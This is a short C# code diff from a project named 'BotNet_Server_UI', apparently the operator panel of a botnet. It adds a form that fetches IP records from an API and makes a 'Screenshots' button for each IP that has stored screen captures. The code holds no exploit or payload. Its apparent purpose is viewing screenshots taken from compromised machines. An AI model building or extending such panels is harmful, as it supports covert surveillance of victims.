@@ -24,16 +24,37 @@ namespace BotNet_Server_UI
             InitializeComponent();
         }
 
-        private void ScrForm_Loaded(object sender, RoutedEventArgs e)
+        private async void ScrForm_Loaded(object sender, RoutedEventArgs e)
         {
-            ListScrenns.Items.Add(new Button()
+            List<Button> buttons = new List<Button>();
+            List<IP> ip = new List<IP>();
+            IP[] arr = await ApiRequest.GetProductAsync<IP[]>("/api/v1/ip");
+            for (int j = 0; j < arr.Length; j++)
             {
+                if (arr[j].ip == "")
+                {
+                    continue;
+                }
+                else if (await ApiRequest.GetProductAsync<Screen>("/api/v1/screens/" + arr[j].id) == default(Screen))
+                {
+                    continue;
+                }
+                ip.Add(arr[j]);
+            }
+            for (int i = 0; i < ip.Count; i++)
+            {
+                buttons.Add(new Button()
+                {
+                    Content = "Скриншоты " + ip[i].ip
+                });
+                buttons[i].Click += Screens_Click;
+                ListScrenns.Items.Add(buttons[i]);
+            }
+        }
 
-            });
-            //for (int i = 0; i < *Length*; i++)
-            //{
+        private void Screens_Click(object sender, RoutedEventArgs e)
+        {
 
-            //}
         }
     }
 }
